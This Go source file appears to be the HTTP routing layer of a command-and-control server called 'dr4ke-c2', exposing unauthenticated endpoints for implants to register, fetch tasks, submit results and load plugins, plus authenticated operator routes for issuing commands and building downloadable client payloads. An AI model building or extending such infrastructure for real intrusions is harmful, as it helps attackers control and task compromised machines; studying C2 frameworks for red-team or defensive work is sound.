package routes

import (
	"dr4ke-c2/server/controllers"
	"dr4ke-c2/server/middlewares"
	"dr4ke-c2/server/utils"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type RouteConfig struct {
	ClientController  *controllers.ClientController
	TaskController    *controllers.TaskController
	AuthController    *controllers.AuthController
	BuilderController *controllers.BuilderController
	StaticFilesPath   string
}

func setupPublicRoutes(mux *http.ServeMux, auth *controllers.AuthController) {
	mux.HandleFunc("/auth/login", auth.Login)
	mux.HandleFunc("/auth/logout", auth.Logout)
	mux.HandleFunc("/auth/verify", auth.VerifyTokenHandler)

	mux.HandleFunc("/test-logs", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Test logs endpoint working at %s\n", time.Now().Format(time.RFC3339))
	})

	mux.HandleFunc("/debug-log-stream", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.Header().Set("Connection", "keep-alive")
		w.Header().Set("Access-Control-Allow-Origin", "*")

		fmt.Fprintf(w, "data: {\"timestamp\":\"%s\",\"level\":\"INFO\",\"message\":\"[DEBUG] Test stream connected\"}\n\n", time.Now().Format(time.RFC3339))
		if f, ok := w.(http.Flusher); ok {
			f.Flush()
		}

		for i := 0; i < 5; i++ {
			time.Sleep(1 * time.Second)
			fmt.Fprintf(w, "data: {\"timestamp\":\"%s\",\"level\":\"INFO\",\"message\":\"[DEBUG] Test message %d\"}\n\n", time.Now().Format(time.RFC3339), i+1)
			if f, ok := w.(http.Flusher); ok {
				f.Flush()
			}
		}
	})
}

func setupClientRoutes(mux *http.ServeMux, config *RouteConfig) {
	mux.HandleFunc("/register", config.ClientController.RegisterHandler)
	mux.HandleFunc("/tasks", config.ClientController.TasksHandler)
	mux.HandleFunc("/submit", config.ClientController.SubmitHandler)
	mux.HandleFunc("/heartbeat", config.ClientController.HeartbeatHandler)

	mux.HandleFunc("/result", config.ClientController.ResultHandler)

	mux.HandleFunc("/plugin/", config.ClientController.ServePluginHandler)
	mux.HandleFunc("/plugins", config.ClientController.ListPluginsHandler)
}

func setupProtectedRoutes(mux *http.ServeMux, config *RouteConfig) {
	if config.AuthController == nil || config.ClientController == nil ||
		config.TaskController == nil || config.BuilderController == nil {
		log.Fatal("Controllers must not be nil")
	}
	auth := config.AuthController
	client := config.ClientController
	task := config.TaskController
	builder := config.BuilderController

	mux.Handle("/clients", auth.RequireAuth(http.HandlerFunc(client.ClientsHandler)))
	mux.Handle("/delete-client", auth.RequireAuth(http.HandlerFunc(client.DeleteClientHandler)))
	mux.Handle("/command", auth.RequireAuth(http.HandlerFunc(client.CommandHandler)))
	mux.Handle("/task-history", auth.RequireAuth(http.HandlerFunc(task.GetTaskHistoryHandler)))
	mux.Handle("/client-task-history", auth.RequireAuth(http.HandlerFunc(task.GetClientTaskHistoryHandler)))
	mux.Handle("/delete-build", auth.RequireAuth(http.HandlerFunc(builder.DeleteBuildHandler)))
	mux.Handle("/upload", auth.RequireAuth(http.HandlerFunc(builder.HandleUpload)))
	mux.Handle("/api/results", config.AuthController.RequireAuth(http.HandlerFunc(config.ClientController.GetResultsHandler)))
	mux.Handle("/api/server-logs", auth.RequireAuth(http.HandlerFunc(client.GetServerLogsHandler)))
	mux.Handle("/api/log-stream", auth.RequireAuth(http.HandlerFunc(client.LogStreamHandler)))
}

func setupBuilderRoutes(mux *http.ServeMux, config *RouteConfig) {
	if config.AuthController == nil || config.BuilderController == nil {
		log.Fatal("Auth and Builder controllers must not be nil")
	}
	builderMux := http.NewServeMux()
	builderMux.HandleFunc("/build", config.BuilderController.BuildClient)
	builderMux.HandleFunc("/download", config.BuilderController.DownloadClient)
	builderMux.HandleFunc("/builder-info", config.BuilderController.GetBuilderInfo)

	builderHandler := config.AuthController.RequireAuth(
		config.BuilderController.BotProtectionMiddleware(
			http.HandlerFunc(builderMux.ServeHTTP),
		),
	)
	mux.Handle("/build", builderHandler)
	mux.Handle("/download", builderHandler)
	mux.Handle("/builder-info", builderHandler)
}

func setupStaticFiles(mux *http.ServeMux, staticPath string) {
	if _, err := os.Stat(staticPath); err != nil {
		utils.LogOutput("[WARNING] Static directory may not exist: %v", err)
		return
	}
	absPath, _ := filepath.Abs(staticPath)
	utils.LogOutput("[ROUTES] Serving static files from: %s (absolute: %s)", staticPath, absPath)
	filepath.Walk(staticPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		relPath, _ := filepath.Rel(staticPath, path)
		if relPath != "." {
			utils.LogOutput("  - %s (%d bytes)", relPath, info.Size())
		}
		return nil
	})
	staticHandler := FileServerWithCustom404(http.Dir(staticPath))
	mux.Handle("/", staticHandler)

	uploadsDir := filepath.Join(staticPath, "uploads")
	if _, err := os.Stat(uploadsDir); err == nil {
		mux.Handle("/uploads/", http.StripPrefix("/uploads/", http.FileServer(http.Dir(uploadsDir))))
		utils.LogOutput("[ROUTES] Serving uploaded files from: %s", uploadsDir)
	}
}

func SetupRoutes(clientController *controllers.ClientController,
	taskController *controllers.TaskController,
	authController *controllers.AuthController,
	builderController *controllers.BuilderController,
	staticFilesPath string) http.Handler {

	config := &RouteConfig{
		ClientController:  clientController,
		TaskController:    taskController,
		AuthController:    authController,
		BuilderController: builderController,
		StaticFilesPath:   staticFilesPath,
	}

	mux := http.NewServeMux()

	setupPublicRoutes(mux, authController)
	setupClientRoutes(mux, config)
	setupProtectedRoutes(mux, config)
	setupBuilderRoutes(mux, config)
	setupStaticFiles(mux, staticFilesPath)

	var handler http.Handler = mux
	handler = middlewares.LoggingMiddleware(handler)
	handler = middlewares.CorsMiddleware(nil)(handler)
	handler = middlewares.CompressionMiddleware(nil)(handler)
	return handler
}

func FileServerWithCustom404(root http.FileSystem) http.Handler {
	fs := http.FileServer(root)
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if path == "/" {
			path = "/index.html"
		}
		f, err := root.Open(path)
		if err != nil {
			if os.IsNotExist(err) {
				utils.LogOutput("[STATIC] File not found: %s", path)
				dir := filepath.Dir(path)
				indexPath := filepath.Join(dir, "index.html")
				f, err = root.Open(indexPath)
				if err == nil {
					defer f.Close()
					path = indexPath
				} else {
					notFoundPath := "/html/404.html"
					f, err = root.Open(notFoundPath)
					if err == nil {
						defer f.Close()
						w.Header().Set("Content-Type", "text/html; charset=utf-8")
						w.WriteHeader(http.StatusNotFound)
						io.Copy(w, f)
						return
					}
					http.NotFound(w, r)
					return
				}
			} else {
				utils.LogOutput("[STATIC] Error opening file %s: %v", path, err)
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
				return
			}
		}
		if f != nil {
			defer f.Close()
		}
		utils.LogOutput("[STATIC] Serving: %s", path)
		fs.ServeHTTP(w, r)
	})
}

func isStaticAsset(path string) bool {
	if strings.HasPrefix(path, "/html/") ||
		strings.HasPrefix(path, "/css/") ||
		strings.HasPrefix(path, "/js/") {
		return true
	}
	if path == "/build" ||
		path == "/download" ||
		path == "/builder-info" ||
		path == "/auth/login" ||
		path == "/auth/verify" ||
		path == "/auth/logout" {
		return true
	}
	if path == "/" || path == "/index.html" {
		return true
	}
	return false
}
